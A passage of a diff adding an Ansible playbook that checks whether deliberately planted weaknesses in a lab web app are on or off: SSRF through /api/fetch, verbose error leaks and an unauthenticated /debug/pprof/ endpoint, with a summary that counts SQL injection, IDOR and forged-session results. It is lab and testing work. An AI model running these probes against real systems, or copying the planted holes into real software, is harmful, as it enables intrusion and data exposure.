+        label: "{{ item }}"
+      changed_when: false
+      failed_when: false
+
+    - name: Start with no evidence of a server-side fetch
+      ansible.builtin.set_fact:
+        app_ssrf_evidence: []
+
+    - name: Record which internal targets came back with a body
+      ansible.builtin.set_fact:
+        app_ssrf_evidence: >-
+          {{ app_ssrf_evidence
+             + ([item.item] if ((item.status | default(0)) == 200
+                               and ((item.content | default('', true) | length) > 0))
+                else []) }}
+      loop: "{{ app_ssrf_probes.results | default([]) }}"
+      loop_control:
+        label: "{{ item.item }}"
+
+    - name: Assert the fetch route reaches internal addresses (ssrf_url_fetch is ON)
+      ansible.builtin.assert:
+        that: app_ssrf_evidence | length > 0
+        fail_msg: >-
+          ssrf_url_fetch is ON in lab.yaml (WEAK_SSRF_URL_FETCH), but
+          /api/fetch returned no body for any internal target
+          ({{ app_ssrf_targets | join(', ') }}; statuses:
+          {{ app_ssrf_probes.results | map(attribute='status') | join(', ') }}).
+          The portal refused to make the request - which is what the OFF case
+          looks like.
+        success_msg: >-
+          ssrf_url_fetch: ON - the portal fetched
+          {{ app_ssrf_evidence | join(', ') }} server-side, including
+          addresses a client cannot reach.
+      when: app_weaknesses.ssrf_url_fetch | default(true) | bool
+
+    - name: Assert the fetch route refuses internal addresses (ssrf_url_fetch is OFF)
+      ansible.builtin.assert:
+        that: app_ssrf_evidence | length == 0
+        fail_msg: >-
+          ssrf_url_fetch is OFF in lab.yaml, but the portal still fetched
+          {{ app_ssrf_evidence | join(', ') }} and returned the body.
+        success_msg: >-
+          ssrf_url_fetch: OFF - every internal target was refused.
+      when: not (app_weaknesses.ssrf_url_fetch | default(true) | bool)
+
+    # ============================================================
+    # 11. verbose_errors_debug_endpoint - errors leak internals and the
+    #     debug endpoint is exposed
+    #     ON  : a handled error carries a stack trace / SQL text, and
+    #           /debug/pprof/ answers
+    #     OFF : the error is generic and /debug/pprof/ does not answer
+    # ============================================================
+    - name: Trigger handled errors
+      ansible.builtin.uri:
+        url: "{{ app_base_url }}{{ item }}"
+        return_content: true
+      register: app_error_probes_result
+      loop: "{{ app_error_probes }}"
+      loop_control:
+        label: "{{ item }}"
+      changed_when: false
+      failed_when: false
+
+    - name: Start with no leaked error detail
+      ansible.builtin.set_fact:
+        app_error_leaks: []
+
+    - name: Record which error responses leaked internals
+      ansible.builtin.set_fact:
+        app_error_leaks: >-
+          {{ app_error_leaks
+             + ([item.item] if (item.content | default('', true)) is search(app_verbose_error_pattern)
+                else []) }}
+      loop: "{{ app_error_probes_result.results | default([]) }}"
+      loop_control:
+        label: "{{ item.item }}"
+
+    - name: Ask for the debug index
+      ansible.builtin.uri:
+        url: "{{ app_base_url }}/debug/pprof/"
+      register: app_pprof
+      changed_when: false
+      failed_when: false
+
+    - name: Assert handled errors leak stack traces or SQL (verbose_errors_debug_endpoint is ON)
+      ansible.builtin.assert:
+        that: app_error_leaks | length > 0
+        fail_msg: >-
+          verbose_errors_debug_endpoint is ON in lab.yaml
+          (WEAK_VERBOSE_ERRORS_DEBUG_ENDPOINT), but none of
+          {{ app_error_probes | join(', ') }} returned a stack trace, a
+          goroutine dump or SQL text (statuses:
+          {{ app_error_probes_result.results | map(attribute='status') | join(', ') }}).
+        success_msg: >-
+          verbose_errors_debug_endpoint: ON - the error raised by
+          {{ app_error_leaks | join(', ') }} carries internals in the body.
+      when: app_weaknesses.verbose_errors_debug_endpoint | default(true) | bool
+
+    - name: Assert handled errors are generic (verbose_errors_debug_endpoint is OFF)
+      ansible.builtin.assert:
+        that: app_error_leaks | length == 0
+        fail_msg: >-
+          verbose_errors_debug_endpoint is OFF in lab.yaml, but
+          {{ app_error_leaks | join(', ') }} still returned a stack trace or
+          SQL text to the client.
+        success_msg: >-
+          verbose_errors_debug_endpoint: OFF - the errors were generic.
+      when: not (app_weaknesses.verbose_errors_debug_endpoint | default(true) | bool)
+
+    - name: Assert the debug index answers (verbose_errors_debug_endpoint is ON)
+      ansible.builtin.assert:
+        that: app_pprof.status | default(0) == 200
+        fail_msg: >-
+          verbose_errors_debug_endpoint is ON in lab.yaml, but /debug/pprof/
+          answered HTTP {{ app_pprof.status | default('no response', true) }}
+          instead of 200, so the debug endpoint is not mounted.
+        success_msg: >-
+          verbose_errors_debug_endpoint: ON - /debug/pprof/ answers
+          unauthenticated.
+      when: app_weaknesses.verbose_errors_debug_endpoint | default(true) | bool
+
+    - name: Assert the debug index is not mounted (verbose_errors_debug_endpoint is OFF)
+      ansible.builtin.assert:
+        that: app_pprof.status | default(0) != 200
+        fail_msg: >-
+          verbose_errors_debug_endpoint is OFF in lab.yaml, but
+          /debug/pprof/ still answered 200 - the debug endpoint is exposed.
+        success_msg: >-
+          verbose_errors_debug_endpoint: OFF - /debug/pprof/ answered
+          {{ app_pprof.status }}.
+      when: not (app_weaknesses.verbose_errors_debug_endpoint | default(true) | bool)
+
+    # ============================================================
+    # Summary - so a run reads as evidence rather than as a green tick
+    # ============================================================
+    - name: Start the tallies empty
+      ansible.builtin.set_fact:
+        app_weakness_on: []
+        app_weakness_off: []
+
+    - name: Tally the toggles as lab.yaml declares them
+      ansible.builtin.set_fact:
+        app_weakness_on: >-
+          {{ app_weakness_on
+             + ([item] if (app_weaknesses[item] | default(true) | bool) else []) }}
+        app_weakness_off: >-
+          {{ app_weakness_off
+             + ([item] if not (app_weaknesses[item] | default(true) | bool) else []) }}
+      loop: "{{ app_weakness_keys }}"
+      loop_control:
+        label: "{{ item }}"
+
+    # A key in lab.yaml that is not in app_weakness_keys is asserted by
+    # nothing here - the evidence would have a hole in it.
+    - name: Note toggles lab.yaml declares that nothing above asserts
+      ansible.builtin.set_fact:
+        app_weakness_unknown: "{{ app_weaknesses.keys() | reject('in', app_weakness_keys) | list }}"
+
+    - name: Report what was validated
+      ansible.builtin.debug:
+        msg: |
+          app01 weakness validation - {{ app_base_url }} ({{ app_weakness_keys | length }} toggles, read-only run)
+
+          Every assertion above passed, so:
+            ON  ({{ app_weakness_on | length }}) the exploit was executed and it SUCCEEDED:
+          {% for key in app_weakness_on %}      {{ key }} - WEAK_{{ key | upper }} is on and the app behaves as declared
+          {% endfor %}    OFF ({{ app_weakness_off | length }}) the exploit was executed and it was REFUSED:
+          {% for key in app_weakness_off %}      {{ key }} - WEAK_{{ key | upper }} is off and the app refuses the exploit
+          {% endfor %}
+          {% if app_weakness_unknown | length > 0 %}
+          NOT ASSERTED: lab.yaml declares {{ app_weakness_unknown | join(', ') }},
+          which no assertion in this playbook covers - the exploit evidence for
+          those toggles does not exist.
+          {% endif %}
+          Evidence from this run: {{ app_search_row_leaks | length }} of {{ app_sqli_search_payloads | length }} search payload(s) leaked api_keys,
+          orders readable by {{ app_lowpriv_user }}: {{ app_idor_readable | join(', ') | default('none', true) }},
+          forged sessions accepted: {{ app_forged_accepted | length }}, internal targets fetched: {{ app_ssrf_evidence | length }},
+          error responses leaking internals: {{ app_error_leaks | length }}.
+          Drift is what fails an assert above: a declared weakness that does
+          not work, or a disabled one that still does.
